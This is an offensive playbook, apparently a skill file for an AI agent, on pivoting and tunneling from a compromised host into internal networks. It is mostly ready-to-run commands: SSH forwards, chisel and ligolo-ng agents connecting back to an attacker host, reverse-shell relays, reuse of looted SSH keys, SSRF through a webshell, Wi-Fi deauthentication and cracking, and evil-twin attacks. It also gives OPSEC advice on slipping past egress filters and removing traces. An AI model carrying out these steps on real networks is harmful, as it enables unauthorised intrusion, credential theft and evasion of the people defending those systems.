---
name: Pivoting and Tunneling
description: Reach internal hosts and ports from a compromised foothold — SSH forwards, chisel, ligolo-ng, sshuttle, socat relays, proxychains, meterpreter routes — to move laterally into segmented networks.
tags: [pivoting, tunneling, lateral-movement, proxychains, ssh, chisel, ligolo, socat, post-exploitation]
recommended_tools: [execute_command, nmap_scan, netexec_scan, curl]
vuln_classes: []
domain: post-exploitation
phase: lateral-movement
---
# Pivoting and Tunneling

Goal: turn a single foothold into network reach. After you land on a host, enumerate its
*other* interfaces (`ip a`, `ipconfig /all`, `route`, `arp -a`, `netstat -ano`) — a second NIC,
a `10.x`/`172.x` subnet, or reachable internal hosts is the whole reason to pivot. Pick a
technique by what you have: a shell only, SSH creds, or a Meterpreter/C2 session.

Core vocabulary (SSH `-L`/`-R`/`-D`):
- **`-L` local forward** — bind a port on YOUR box → forward to a host reachable from the pivot. Pull one internal service to you.
- **`-R` remote forward** — bind a port on the PIVOT → forward back to you. Expose your listener/service to the internal net.
- **`-D` dynamic (SOCKS)** — turn SSH into a SOCKS proxy; route *any* tool through the pivot via proxychains.

## Enumerate the pivot's reach first
```bash
ip -br a; ip route; arp -a                      # linux: extra NICs, subnets, live neighbors
ipconfig /all & route print & arp -a            # windows
cat /etc/hosts; cat /etc/resolv.conf            # named internal hosts, internal DNS
ss -tlnp || netstat -ano                         # services bound to 127.0.0.1 (only reachable via pivot)
for i in $(seq 1 254); do ping -c1 -W1 10.10.20.$i >/dev/null && echo 10.10.20.$i up; done
```
**Proof:** you can name at least one host/port reachable from the pivot but NOT from your attack box.

## SSH dynamic SOCKS + proxychains (default choice when you have SSH)
Best general-purpose pivot: one SOCKS port, then run any tool through it.
```bash
ssh -D 1080 -N -f <USER>@<PIVOT_IP>            # -N no shell, -f background; SOCKS on :1080
# /etc/proxychains4.conf tail:  socks5 127.0.0.1 1080
proxychains -q nmap -sT -Pn -n -p 22,80,445,3389 <INTERNAL_TARGET>
proxychains -q curl http://<INTERNAL_TARGET>/
proxychains -q netexec smb <INTERNAL_CIDR>
```
- Use `-sT` (TCP connect) with nmap; SOCKS can't carry raw SYN/`-sS`. No ICMP through SOCKS → always `-Pn`.
- `proxychains -q` silences the noisy `|S-chain|` lines.

**Proof:** `proxychains nmap` returns open ports on an internal host your box can't reach directly.

## SSH local forward `-L` (pull one internal service to you)
When you only need a specific internal service (web panel, DB, RDP).
```bash
ssh -L 8080:<INTERNAL_TARGET>:80  -N -f <USER>@<PIVOT_IP>     # internal :80 → localhost:8080
ssh -L 13306:<DB_HOST>:3306       -N -f <USER>@<PIVOT_IP>     # internal MySQL → localhost:13306
curl http://127.0.0.1:8080/
mysql -h 127.0.0.1 -P 13306 -u <USER> -p
```
**Proof:** hitting `127.0.0.1:<localport>` returns the banner/response of the internal service.

## SSH remote forward `-R` (expose YOUR service to the internal net)
When the internal host must call back to you (reverse shell catcher, hosted payload, relay) but
can't route to your box.
```bash
# On your box: nc -lvnp 4444
ssh -R 4444:localhost:4444 -N -f <USER>@<PIVOT_IP>   # pivot :4444 → your :4444
# Now internal hosts point their reverse shell at <PIVOT_IP>:4444
```
For a full reverse SOCKS from a pivot where you can't inbound-connect: `ssh -R 1080 ...` (OpenSSH ≥ dynamic remote) or use chisel/ligolo below.
**Proof:** an internal host connects to `<PIVOT_IP>:<port>` and the traffic lands on your listener.

## sshuttle (transparent VPN-like, no proxychains)
When you have SSH creds and want a whole subnet routed transparently — best for tools that
don't honor SOCKS.
```bash
sshuttle -r <USER>@<PIVOT_IP> 10.10.20.0/24 -x <PIVOT_IP>
sshuttle -r <USER>@<PIVOT_IP> 0/0 --dns          # route everything incl. DNS through pivot
```
Requires Python on the pivot; no root on target needed. After it's up, run tools normally (no `proxychains`).
**Proof:** a plain `nmap 10.10.20.5` (no proxychains) reaches the internal host.

## chisel (shell-only, no SSH — HTTP-tunneled SOCKS/port-forward)
Go binary, single static file, tunnels over HTTP(S) — ideal when you only have a shell and SSH
isn't available or is firewalled. Same binary is server and client.
```bash
# Attacker (server, reverse mode):
./chisel server -p 8000 --reverse
# Pivot (client) → reverse SOCKS back to attacker:
./chisel client <ATTACKER_IP>:8000 R:1080:socks
# then proxychains (socks5 127.0.0.1 1080) as above
# Single port-forward instead of SOCKS: expose internal RDP to attacker's :3389
./chisel client <ATTACKER_IP>:8000 R:3389:<INTERNAL_TARGET>:3389
```
Windows pivot: `chisel.exe client <ATTACKER_IP>:8000 R:1080:socks`. Use `--reverse` on server for `R:` tunnels.
**Proof:** SOCKS on attacker's `127.0.0.1:1080` reaches internal hosts; chisel logs show the tunnel session established.

## ligolo-ng (preferred modern pivot — real TUN interface)
Gives a routable TUN interface, so all tools work natively (no proxychains, no per-port forwards).
Cleanest for multi-hop and double-pivots.
```bash
# Attacker: create the tun once
sudo ip tuntap add user $USER mode tun ligolo && sudo ip link set ligolo up
./proxy -selfcert                                   # ligolo proxy, listens :11601
# Pivot (agent):
./agent -connect <ATTACKER_IP>:11601 -ignore-cert
# In ligolo console: session; then add route to the internal subnet:
#   sudo ip route add 10.10.20.0/24 dev ligolo
#   >> start
```
Expose an internal service back to attacker with a listener: `listener_add --addr 0.0.0.0:3389 --to 127.0.0.1:3389` (agent side).
**Proof:** `nmap 10.10.20.0/24` from the attacker (no proxychains) returns hosts via the `ligolo` interface.

## socat relay (quick port bounce, no SSH/no C2 framework)
When you have code-exec/shell on the pivot and just need to relay one TCP port. Works where only
socat/ncat is available.
```bash
# On pivot: forward pivot :8080 → internal web :80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:<INTERNAL_TARGET>:80
# Encrypted relay / chain through two hops:
socat TCP-LISTEN:9999,fork TCP:<NEXT_HOP>:9999
```
ncat equivalent: `ncat -lvkp 8080 -c "ncat <INTERNAL_TARGET> 80"`. For Windows, use `socat.exe` or a `netsh` portproxy:
```cmd
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=<INTERNAL_TARGET>
```
**Proof:** connecting to the pivot's relay port returns the internal service's response.

## Meterpreter / C2 routes (pivot inside the framework)
When your foothold is a Meterpreter session — add a route and use Metasploit modules or a SOCKS proxy directly.
```
# In msfconsole, session N is on the pivot:
run autoroute -s 10.10.20.0/24            # or: route add 10.10.20.0/24 N
use auxiliary/server/socks_proxy          # SOCKS5 on 1080 → proxychains for external tools
run
# Direct local port-forward through the session:
portfwd add -l 3389 -p 3389 -r <INTERNAL_TARGET>
```
Sliver/Cobalt equivalents: `socks5 start` / `socks` and `rportfwd`.
**Proof:** an internal-subnet module (e.g. `smb_version`) run through the session returns results; portfwd'd local port reaches the internal host.

## SSH artifact reuse (before hunting new creds)
Looted keys and cached sessions are the cheapest pivot — check the pivot's SSH state first.
```bash
ssh -i <LOOTED_KEY> <USER>@<INTERNAL_TARGET>          # keys from /root/.ssh, C:\users\*\.ssh\id_rsa, container /root
ssh <USER>@<DOMAIN>@<INTERNAL_HOST>                   # ControlMaster socket in ~/.ssh/config → reuses cached/Kerberos session, no password
```
Restricted SFTP/`ForceCommand internal-sftp` accounts often still allow `AllowTcpForwarding` — a locked shell does NOT mean you can't tunnel:
```bash
sshpass -p '<PASS>' ssh <USER>@<PIVOT_IP> -N -L 9229:127.0.0.1:9229   # reach localhost-bound Node inspector etc.
```
**Proof:** shell on the internal host, or the forwarded localhost port responds despite the restricted shell.

## SSRF / app-layer pivots (no tunnel binary needed)
When you can't drop a binary but the app can reach internal hosts, make the app fetch for you.
```bash
# PHP webshell → reach cluster/container-internal service unreachable from you:
php -r "echo file_get_contents('http://<INTERNAL_IP>:5000/');"
# Open Squid proxy (3128) → scan localhost behind it, then route tools through it:
uv run spose.py --proxy http://<PIVOT_IP>:3128 --target localhost --allports
# proxychains4.conf:  http 127.0.0.1 3128   → proxychains curl/nmap through Squid
# Header-based SSRF (CVE-2022-38580 Skipper): reach 127.0.0.1 services / port-scan:
ffuf -u http://<TARGET> -H 'X-Skipper-Proxy: http://127.0.0.1:FUZZ' -w <(seq 0 65535) -ac
```
Also: headless-Chrome upload jobs that `fetch()` internal URLs from a `background.js`; HMAC/digest/cert-signing oracles that let you sign an attacker URL and replay it through the app's own `/fetch`/proxy. Registry/registry-poison pivots (Eureka register+delete to MITM inter-service login; open Docker registry `/v2/_catalog` pull; k8s serviceaccount token → read namespace secrets) reach services the network layer won't.
**Proof:** an internal-only URL/service returns content (or creds land on your `nc` listener) via the app, with no port tunnel.

## Wireless / VPN pivots
When the foothold has a `wlan` NIC or hands out VPN configs, the adjacent segment is the target.
```bash
iwconfig; iw dev wlan0 scan                                   # find AP, BSSID, channel, WPS
# WPA2-PSK capture+crack, then join the VLAN:
airmon-ng start wlan0; airodump-ng wlan0mon -c <CH> --bssid <BSSID> -w cap
aireplay-ng --deauth 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon
aircrack-ng -w rockyou.txt cap-01.cap
wpa_passphrase '<ESSID>' '<PSK>' > wifi.conf
wpa_supplicant -B -i <WLAN_IF> -c wifi.conf && dhclient -v <WLAN_IF>
# Stolen per-user VPN config:
sudo openvpn <USER>.ovpn
```
For WPA2-Enterprise, evil-twin with looted certs (`eaphammer --cert-wizard import ...; eaphammer -i <IF> --auth wpa-eap --essid <ESSID>`) → crack captured NetNTLM (`hashcat -m 5500`).
**Proof:** DHCP lease on the new VLAN / VPN IP assigned, and internal hosts on that segment respond.

## Accessing internal web / DB once tunneled
```bash
proxychains -q curl -s http://<INTERNAL_TARGET>:8080/    # web app only bound internally
mysql   -h 127.0.0.1 -P 13306 -u <USER> -p              # via -L forward
psql    -h 127.0.0.1 -p 15432 -U <USER>
proxychains -q mssqlclient.py <DOMAIN>/<USER>:<PASS>@<INTERNAL_TARGET>
proxychains -q evil-winrm -i <INTERNAL_TARGET> -u <USER> -p <PASS>
proxychains -q xfreerdp /v:<INTERNAL_TARGET> /u:<USER> /p:<PASS> /cert:ignore
```
For RDP/GUI that dislikes SOCKS latency, prefer a `-L`/chisel port-forward over dynamic SOCKS.

## Decision cheat sheet
| You have | Want | Use |
|---|---|---|
| SSH creds | Route everything | `sshuttle` or `ssh -D` + proxychains |
| SSH creds | One service | `ssh -L` |
| SSH creds | Expose your listener inward | `ssh -R` |
| Shell only, no SSH | SOCKS/port-forward over HTTP | chisel |
| Shell only, clean multi-hop | Routable subnet | ligolo-ng |
| Shell, just bounce a port | Single TCP relay | socat / netsh portproxy |
| Meterpreter/C2 session | Subnet reach | autoroute + socks_proxy / portfwd |

## Operational notes
- **Chaining / double-pivot:** repeat the technique from the second host. ligolo-ng and chisel handle multi-hop cleanly; nested proxychains gets fragile fast.
- **DNS:** SOCKS doesn't resolve internal names — use `proxychains ... <IP>`, `proxychains4` with `proxy_dns`, or point `/etc/resolv.conf` at the internal DNS via sshuttle `--dns`.
- **OPSEC:** prefer reverse tunnels (`-R`, chisel/ligolo agent dialing out) — egress is usually less filtered than ingress. Tunnel over 443 where possible; clean up listeners (`kill`, `netsh ... delete`, remove dropped binaries).
- **No raw sockets over SOCKS:** always `nmap -sT -Pn`; UDP and ICMP won't traverse SOCKS (they do over sshuttle/ligolo TUN).
- **Verify the pivot before scanning wide:** confirm one host:port reachable through the tunnel before launching a full sweep, so a broken tunnel doesn't look like a dead subnet.
